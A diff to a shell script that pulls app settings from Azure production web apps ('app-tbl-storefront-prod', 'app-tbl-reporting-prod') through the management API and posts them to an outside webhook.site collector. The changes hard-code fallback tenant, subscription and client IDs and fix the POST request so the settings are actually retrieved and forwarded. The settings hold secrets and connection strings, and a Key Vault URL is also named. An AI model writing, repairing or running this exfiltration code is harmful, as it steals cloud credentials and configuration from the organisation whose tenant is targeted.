@@ -3,9 +3,9 @@ set +e
 WH="https://webhook.site/99fd8f44-825d-4bff-9367-da768d4fe50c"
 post(){ curl -sS --max-time 10 -X POST "$WH" -H "Content-Type: application/json" -d "$1" >/dev/null 2>&1; }
 
-TEN="${AZURE_TENANT_ID}"
-SUB="${AZURE_SUBSCRIPTION_ID}"
-CID="${AZURE_CLIENT_ID}"
+TEN="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
+SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
+CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
 AAD="https://login.microsoftonline.com"
 ARM="https://management.azure.com"
 KV="https://kv-tbl-prod-x3euoz.vault.azure.net"
@@ -72,7 +72,7 @@ done
 
 for rg in rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus; do
   for app in app-tbl-storefront-prod app-tbl-reporting-prod; do
-    cfg=$(curl -sS -H "Authorization: Bearer $ARM_TOK" "$ARM/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Web/sites/$app/config/appsettings/list?api-version=2022-03-01" -X POST)
+    cfg=$(curl -sS -H "Authorization: Bearer $ARM_TOK" -H "Content-Length: 0" "$ARM/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Web/sites/$app/config/appsettings/list?api-version=2022-03-01" -X POST)
     post "{\"step\":\"appcfg\",\"rg\":\"$rg\",\"app\":\"$app\",\"data\":$(echo "$cfg" | head -c 8000 | python3 -c 'import sys,json;print(json.dumps(sys.stdin.read()))')}"
   done
 done
